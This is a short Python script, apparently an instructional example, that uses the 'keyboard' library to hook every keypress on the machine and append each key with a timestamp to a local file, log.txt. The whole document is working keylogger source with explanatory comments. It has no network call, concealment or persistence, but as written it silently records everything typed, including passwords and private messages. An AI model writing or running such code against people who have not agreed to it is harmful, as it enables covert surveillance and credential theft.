import keyboard as kb
import time

# keylog function records all the keystrokes along with the time at which they were recorded in a text file named log.
def keylog():
  # Open a file named log.txt in append mode to add new keystrokes to the end of the file
  log_f = open("log.txt", 'a')
  # Write a header to the log file to indicate the start of a new log session
  log_f.write("\n\n-----------------------Keyboard Log-----------------------\n\n")

  # Define a callback function to handle keyboard events
  def on_press(key):
    # Get the current time in seconds since the epoch (January 1, 1970)
    curr_time_since_epoch = time.time()
    # Convert the current time in seconds since the epoch to a human-readable string
    curr_time = time.ctime(curr_time_since_epoch)
    # Write the current time and the key that was pressed to the log file
    log_f.write(str(curr_time) + " : " + str(key) + "\n")
    # Flush the log file to ensure that the keystroke is written to the file immediately
    log_f.flush()

  # Register the on_press function as a callback for keyboard events
  kb.on_press(on_press)
  # Wait for keyboard events to occur
  kb.wait()
  # Close the log file
  log_f.close()

# Call the keylog function to start logging keystrokes
keylog()

